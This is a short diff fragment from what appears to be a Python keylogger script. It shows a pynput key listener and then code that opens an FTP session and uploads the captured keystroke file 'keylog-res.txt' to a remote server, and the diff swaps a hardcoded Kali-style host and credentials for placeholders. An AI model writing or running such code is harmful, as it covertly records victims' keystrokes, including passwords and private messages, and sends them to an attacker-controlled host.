@@ -20,7 +20,7 @@ with Listener(on_press=press_key, on_release=release_key)as Listener:
     Listener.join()
 
 # initiating a FTP session
-session = ftplib.FTP("10.120.0.76","kali","kali")
+session = ftplib.FTP("ip","username","password")
 file = open("keylog-res.txt", "rb")
 session.storbinary("STOR keylog-res.txt", file)
 file.close()
